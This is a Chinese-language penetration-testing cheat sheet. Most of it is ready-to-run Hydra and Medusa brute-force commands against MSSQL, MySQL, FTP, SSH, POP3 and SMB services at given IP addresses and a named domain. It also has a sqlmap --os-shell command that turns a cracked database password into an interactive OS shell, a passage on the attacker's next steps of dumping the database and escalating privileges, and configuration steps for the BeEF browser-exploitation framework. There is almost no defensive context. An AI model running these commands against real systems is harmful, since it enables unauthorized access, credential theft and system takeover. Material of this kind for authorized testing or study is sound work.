# TOOL using
## `Fiddler`是最强大最好用的Web调试工具之一
- 流光 官方版v5.0

## SQLMAP

## `Fiddler`是最强大最好用的Web调试工具之一

## 暴力破解
搜集用户名是重点。搜集的方式有：1通过邮箱搜集；2通过错误提示搜集。
### Hydra暴力破解
首先用Nmap扫描到某个系统开放了1433端口。
- 破解MySQL密码
    + hydra.exe -l sa -P c:\pass.txt 192.168.1.110 mssql
    + hydra.exe -L c:\user.txt -P c:\pass.txt 192.168.1.110 mysql
    + 使用-L指定用户名文件，-P指定密码文件
- 破解FTP密码
    + hydra.exe -l admin -P c:\pass.txt -t 5 192.168.1.110 ftp
    + 使用-l指定用户名，-t指定线程
- 破解ssh
    + hydra.exe -L users.txt -P password.txt -e n -t 5 -vV 192.168.1.110 ssh
    + 使用“-e n”对空密码探测
- 破解 pop3
    + hydra.exe -l root -P pass.txt my.pop3.mail pop3
- 攻击者一旦得到数据库密码，一般会做两件事情，一是“拖库”，二是“提权”。
    + 上面破解密码为“pwd@123”之后，可以利用sqlmap进一步来反弹一个与系统交互的Shell用来提权。命令为：
    + sqlmap.py -d "mssql://sa:pwd@123@192.168.1.110:1433/master" --os-shell

### Medusa
- 破解mysql:`medusa -h 192.168.195.129 -u root -P /pass.txt -M mysql`
- 破解MSSQL:`medusa -h 192.168.1.110 -u sa -P /pass.txt -t 5 -f -M mssql`
    + 使用“-t”参数指定线程，“-f”指定在任何主机上找到第1个账号/密码后，停止审计。
- 破解SSH:`medusa -M ssh -H host.txt -U user.txt -p password` 使用“-U”参数读取用户名字典文件users.txt
- 日志文件:`medusa -h 192.168.1.110 -u sa -P /pass.txt -t 5 -f -e ns -M mssql -O /ap.txt`
- 破解smbnt
    + medusa -h www.secbug.org -u administrator -P /pass.txt -e ns -M smbnt
    + 使用“-h”参数对主机www.secbug.org破解smbnt服务，并使用“-e ns”参数，尝试空密码及账号为密码。
    + 使用“-C”参数破解smbnt
    + medusa -M smbnt -C combo.txt
    + combo文件的格式如下：
    + 192.168.0.20:testuser:pass
    + 192.168.0.40:user1:foopass

## RouterSploit
专门针对嵌入式设备的漏洞利用工具
- [RouterSploit](`https://github.com/threat9/routersploit`)

## XSS
### BeEF（The Browser Exploitation Framework）：针对浏览器的渗透测试工具
- http://beefproject.com
- beef xss framework
- 在beef配置文件(/usr/share/beef-xss/config.yaml)中修改密码（默认账户密码:beef/beef）
- 同Metasploit关联，使用msf模块
    + metasploit:
            enable: false改为true
    + `/usr/share/beef-xss/extensions/demos/config.yaml`
        * enable: true改为false
    + `/usr/share/beef-xss/extensions/metasploit/config.yaml`
        * ssl: true
        * ssl_version: 'TLSv1'

